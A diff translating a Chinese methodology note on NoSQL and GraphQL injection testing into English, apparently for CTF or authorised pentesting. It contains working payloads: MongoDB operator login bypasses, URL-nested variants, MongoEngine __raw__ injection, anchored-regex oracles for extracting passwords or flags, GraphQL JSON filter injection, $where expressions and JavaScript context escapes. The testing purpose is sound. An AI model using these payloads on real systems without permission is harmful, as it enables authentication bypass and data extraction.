@@ -1,27 +1,27 @@
 # NoSQL / GraphQL Injection
 
-先证明对象、操作符或字段选择到达后端查询层；不要把“能请求字段”误判成注入。
+First prove that an object, operator, or field selector reaches the backend query layer. Do not confuse "the API can return a field" with injection.
 
-## 入口信号
+## Entry Signals
 
-- JSON 登录、搜索、筛选、排序参数被直接合并进查询对象。
-- URL query 支持嵌套对象：`username[$ne]=x`。
-- MongoDB/Mongoose/MongoEngine 错误、`filter(**data)`、`Q(**data)`、动态字段名。
-- GraphQL resolver 接收 JSON scalar、filter/search 对象，或响应提示隐藏字段。
-- 字符串换成对象后，登录态、结果数量、错误文本或耗时发生稳定变化。
+- JSON login, search, filter, or sort parameters are merged directly into a query object.
+- URL query supports nested objects such as `username[$ne]=x`.
+- MongoDB/Mongoose/MongoEngine errors, `filter(**data)`, `Q(**data)`, or dynamic field names appear.
+- GraphQL resolvers accept JSON scalars or filter/search objects, or errors suggest hidden fields.
+- Replacing a string with an object stably changes login state, result count, error text, or timing.
 
-## 解析边界
+## Parser Boundary
 
-先确认后端收到的是对象而不是字符串：
+Confirm that the backend receives an object rather than a string:
 
-- `Content-Type`：`application/json`、`x-www-form-urlencoded`、GraphQL variables、JSON cookie 可能走不同 parser。
-- URL 嵌套：`a[$ne]=x`、`a[regex]=x`、`filter[field][$regex]=^a` 取决于 qs/parser 配置。
-- 重复 key：JSON/对象合并时可能“后者覆盖前者”，可用于移除预设条件或覆盖字段。
-- 类型混淆：字符串等值检查如果直接传给 ORM/ODM，可能接受 `{not: ...}`、`{"$ne": ...}` 或数组。
+- `Content-Type`: `application/json`, `application/x-www-form-urlencoded`, GraphQL variables, and JSON cookies can use different parsers.
+- URL nesting: `a[$ne]=x`, `a[regex]=x`, and `filter[field][$regex]=^a` depend on the query parser.
+- Duplicate keys: JSON/object merge behavior may let the later key overwrite the earlier one.
+- Type confusion: equality checks that pass directly into an ORM/ODM may accept `{not: ...}`, `{"$ne": ...}`, or arrays.
 
-## 操作符验证
+## Operator Validation
 
-认证点：
+Authentication points:
 
 ```json
 {"username":{"$ne":null},"password":{"$ne":null}}
@@ -29,14 +29,14 @@
 {"username":{"$regex":"^admin$"},"password":{"$gt":""}}
 ```
 
-URL 嵌套形式：
+URL nested form:
 
 ```text
 username[$ne]=x&password[$ne]=x
 username=admin&password[$regex]=.*
 ```
 
-搜索/筛选点：
+Search/filter points:
 
 ```json
 {"field":{"$exists":true}}
@@ -45,11 +45,11 @@ username=admin&password[$regex]=.*
 {"field":{"$in":["admin","root","administrator"]}}
 ```
 
-如果对象被字符串化，转向服务端解析边界：Content-Type、JSON vs form、重复参数、数组参数、GraphQL variable 类型。
+If the object is stringified, move back to the parser boundary: content type, JSON versus form, duplicate parameters, array parameters, or GraphQL variable types.
 
 ## MongoEngine / ODM
 
-动态 `filter(**data)` 常见风险是 key 穿透到查询表达式。优先证明 `__raw__` 或双下划线 lookup 是否被保留：
+Dynamic `filter(**data)` is risky when keys pass through into query expressions. First prove whether `__raw__` or double-underscore lookup is preserved:
 
 ```json
 {"__raw__":{"username":"candidate"}}
@@ -58,15 +58,15 @@ username=admin&password[$regex]=.*
 {"username__regex":"^admin"}
 ```
 
-判断标准：同一接口中，普通条件和 raw/lookup 条件造成可解释的结果集差分。
+Evidence standard: on the same endpoint, ordinary conditions and raw/lookup conditions produce an explainable result-set difference.
 
-如果接口接受完整聚合 pipeline，再检查 `$match/$project/$lookup/$unionWith/$facet` 是否可控；目标是证明能跨集合、改返回字段或绕过预置 `$match`，不要直接假设 pipeline 全可控。
+If the endpoint accepts a full aggregation pipeline, check whether `$match/$project/$lookup/$unionWith/$facet` is controllable. The goal is proving cross-collection access, return-field changes, or bypassing a preset `$match`, not assuming the whole pipeline is controllable.
 
 ## Regex / Exists Oracle
 
-- 用 `$exists` 判断字段是否存在，再把字段加入可返回字段或 GraphQL selection set。
-- 用锚定 `$regex` 做前缀提取，避免 `.*a.*` 这类噪声匹配。
-- 每次只比较两个候选前缀，记录匹配/不匹配 marker。
+- Use `$exists` to test field presence, then request the field through the response field list or GraphQL selection set.
+- Use anchored `$regex` for prefix extraction; avoid noisy `.*a.*` matches.
+- Compare two candidate prefixes at a time and record the match/no-match marker.
 
 ```json
 {"username":"admin","password":{"$regex":"^a"}}
@@ -74,19 +74,19 @@ username=admin&password[$regex]=.*
 {"target_field":{"$regex":"^flag\\{"}}
 ```
 
-特殊字符进入 regex 前必须转义；若 regex 被禁，尝试 `$in`、范围比较或字段存在性组合。
+Escape special characters before they enter a regex. If regex is blocked, try `$in`, range comparisons, or field-existence combinations.
 
-大小写和排序受 collation 影响。先用已知字段校准 `$regex` 是否区分大小写；必要时使用显式大小写模式或按候选字符集线性验证。
+Case sensitivity and sort order are affected by collation. Calibrate with a known field before extracting case-sensitive values.
 
 ## GraphQL
 
-先分清三件事：
+Separate three surfaces:
 
-- selection set：决定返回字段，可能暴露 `role/secret/flag` 等隐藏字段。
-- argument/filter：可能进入 SQL/NoSQL 查询。
-- variable 类型：决定对象操作符是否能原样到达 resolver。
+- Selection set: controls returned fields and may expose `role/secret/flag`.
+- Argument/filter: may reach SQL or NoSQL queries.
+- Variable type: determines whether object operators arrive at the resolver unchanged.
 
-字段发现优先级：introspection -> 错误建议 -> 前端 bundle -> 小范围字段猜测。
+Field discovery priority: introspection, error suggestions, frontend bundles, then small field guesses.
 
 ```graphql
 query {
@@ -94,9 +94,9 @@ query {
 }
 ```
 
-如果 introspection 关闭，保留错误建议、响应中的 `Cannot query field`、前端 query 文档、operationName 和变量 schema 作为替代证据。
+If introspection is disabled, keep error suggestions, `Cannot query field` responses, frontend query documents, `operationName`, and variable schema as substitute evidence.
 
-当 filter/search 支持对象时，用 true/false 条件做同请求或成对请求对比：
+When filter/search accepts objects, compare true/false conditions in the same request shape:
 
 ```graphql
 query($f: JSON) {
@@ -108,26 +108,26 @@ query($f: JSON) {
 {"f":{"__raw__":{"target_field":{"$exists":true}}}}
 ```
 
-GraphQL 能返回某字段不等于注入成功；必须证明 filter 条件能选择包含该字段或特定值的记录。
+GraphQL returning a field is not enough. Prove the filter condition can select records containing that field or a target value.
 
-GraphQL 接受 GET 时，仍按普通请求复现 oracle；只有在 admin bot/CSRF/XS-Leak 场景中，才把 GET 特性当成投递或侧信道能力。
+When GraphQL accepts GET, still reproduce the oracle like a normal request. Treat GET delivery as relevant only for admin bot, CSRF, or XS-Leak-style side channels.
 
-## 执行型操作符
+## Executing Operators
 
-`$where`、server-side JavaScript、表达式执行类只在明确证据显示后端使用相应能力时测试；优先使用非执行型 `$exists/$regex/$ne/$in` 建 oracle。
+Test `$where`, server-side JavaScript, and expression execution only when evidence shows the backend uses that capability. Prefer non-executing `$exists/$regex/$ne/$in` oracles first.
 
 ```json
 {"$where":"this.username=='admin'"}
 ```
 
-如果用户输入被拼进 JavaScript regex 字面量或 `$where` 字符串，先用真假表达式证明能逃出原上下文：
+If input is concatenated into a JavaScript regex literal or `$where` string, first prove context escape with true/false expressions:
 
 ```text
 a/)||true&&(/a
 a/)||false&&(/a
 ```
 
-## 结论格式
+## Finding Record
 
 ```text
 entry_point:
